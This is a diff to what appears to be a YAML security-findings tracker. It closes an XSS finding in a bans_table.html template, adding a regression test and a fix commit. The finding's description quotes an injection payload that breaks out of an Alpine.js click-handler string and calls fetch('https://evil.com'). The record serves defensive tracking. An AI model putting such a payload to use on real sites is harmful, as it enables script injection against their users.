@@ -687,13 +687,14 @@ findings:
     discovered: '2026-04-17'
   remediation_phases:
   - 119h
+  - 118t
   discovered: '2026-04-17'
   due: '2026-05-17'
-  status: OPEN
+  status: FIXED
   supersedes: []
   depends_on: []
-  regression_test: ''
-  closed_commit: ''
+  regression_test: management/tests/test_pentest_bans_table_xss_regression.py::test_source_does_not_interpolate_ip_inside_click_string_literal
+  closed_commit: 906b514aeea76b6a74d6fa1a675887419085ab00
   description: management/templates/partials/bans_table.html embeds {{ ban.ip }} inside Alpine.js @click
     handler in a JavaScript string literal. While Jinja2 HTML-escapes, Alpine.js @click directives may
     interpret decoded attribute values as JavaScript. A ban with IP containing `'); fetch('https://evil.com');//`
